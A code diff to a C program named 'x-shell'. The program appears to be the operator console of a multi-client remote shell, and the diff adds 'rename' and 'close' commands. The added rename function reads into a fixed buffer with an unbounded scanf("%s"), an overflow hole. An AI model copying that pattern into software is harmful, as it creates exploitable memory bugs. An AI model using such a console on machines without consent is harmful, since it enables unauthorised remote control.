@@ -71,6 +71,20 @@ void print_ascii_art()
 
     printf("%s", xshell_art);
 }
+int  exec_close_command()
+{
+
+    uint16_t cid;
+    scanf("%hu", &cid);
+    xclient_t *target_client = xclient_list_find(&list, cid);
+    if (target_client == NULL)
+    {
+        printf("[!] Client with %hu id didn't find!\r\n", cid);
+        return -1;
+    }
+    xclient_list_remove(&list, cid);
+    return 0;
+}
 void print_help()
 {
     const char *xshell_help =
@@ -80,6 +94,7 @@ void print_help()
         "  upload <cid> <HFILE> <SAVELOCATION>     upload the HFILE from the Host to client with <cid> id and save it to SAVELOCATION\n"
         "  close <cid>                             close the connection to client with <cid> id\n"
         "  help                                    show programs options\n"
+        "  rename <cid> <newname>                  change the local name of client with <cid> id to <newname>\n"
         "  clear                                   clear screen\n"
         "  exit                                    exit the x-shell\n\n";
 
@@ -113,7 +128,25 @@ void *accept_worker(void *arg)
     }
     xtcpsocket_close(server_socket);
 }
-
+int exec_rename_command()
+{
+    uint16_t cid;
+    scanf("%hu", &cid);
+    xclient_t *target_client = xclient_list_find(&list, cid);
+    if (target_client == NULL)
+    {
+        printf("[!] Client with %hu id didn't find!\r\n", cid);
+        return -1;
+    }
+    char buff[LOCALNAME_MAX_LEN];
+    scanf("%s", buff);
+    if (xclient_set_localname(target_client, buff))
+    {
+        printf("[!] failed to change the client local name\r\n");
+        return -1;
+    }
+    return 0;
+}
 int exec_shell_command()
 {
     xrequest_t req;
@@ -186,7 +219,6 @@ int exec_download_command()
         return -1;
     }
 
-
     xfile_t file;
     char client_file_path[256];
     char save_location[256];
@@ -239,7 +271,7 @@ int exec_upload_command()
     }
 
     xrequest_send(&target_client->socket, &req);
-    
+
     if (make_fhandshake(&target_client->socket, client_save_location, &file, XFMODE_UPLOAD) == -1)
     {
         printf("[!] failed to handshake\r\n");
@@ -329,6 +361,14 @@ int main()
         else if (!strcmp(command, "upload"))
         {
             exec_upload_command();
+        }
+        else if (!strcmp(command, "rename"))
+        {
+            exec_rename_command();
+        }
+        else if (!strcmp(command, "close"))
+        {
+            exec_close_command();
         }
         else
         {
